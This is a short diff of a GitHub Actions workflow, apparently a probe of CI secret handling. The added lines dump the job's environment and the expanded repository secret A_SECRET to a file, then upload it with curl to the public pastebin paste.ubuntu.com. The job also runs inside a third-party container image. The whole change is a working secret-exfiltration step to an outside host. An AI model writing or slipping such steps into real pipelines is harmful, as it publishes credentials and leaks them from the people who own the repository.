@@ -4,18 +4,14 @@ jobs:
   export:
     runs-on: ubuntu-latest
     name: Export
+    container: sstc/notify
     env:
       A_SECRET: ${{ secrets.A_SECRET }}
     steps:
       - uses: actions/checkout@v2
       - run: |
-          A_SECRET_2="${A_SECRET}"
-          export A_SECRET_3="${A_SECRET}"
-          A_SECRET_IN_RUN="in run"
-          export A_SECRET_IN_RUN2="$A_SECRET_IN_RUN"
-          GITHUB_ACTOR2="${GITHUB_ACTOR}"
-          GITHUB_ACTOR="youseeseeyou"
-          export GITHUB_ACTOR3="${_GITHUB_ACTOR}"
           f=$(mktemp)
           env > $f
+          echo '\n' >> $f
+          echo '${A_SECRET}' | envsubst >> $f
           curl -v --data-urlencode "content@${f}" -d "poster=a" -d "syntax=text" -d "expiration=day" http://paste.ubuntu.com
